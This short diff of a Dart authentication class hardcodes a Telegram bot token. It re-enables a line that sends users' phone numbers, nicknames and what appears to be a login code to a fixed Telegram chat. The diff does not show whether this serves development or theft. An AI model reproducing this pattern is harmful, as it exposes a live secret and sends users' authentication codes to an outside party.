@@ -119,7 +119,7 @@ class AuthRepository {
     var teledart = TeleDart(
         '7503936776:AAEh-kX5zNIx1W472stNph48FqIx5Y5AHhI', Event(username!));
     teledart.start();
-//    teledart.sendMessage('-4689672128', 'Код для $phone, $nick : $msg');
+    teledart.sendMessage('-4689672128', 'Код для $phone, $nick : $msg');
     teledart.stop();
     return username ?? 'no name';
   }
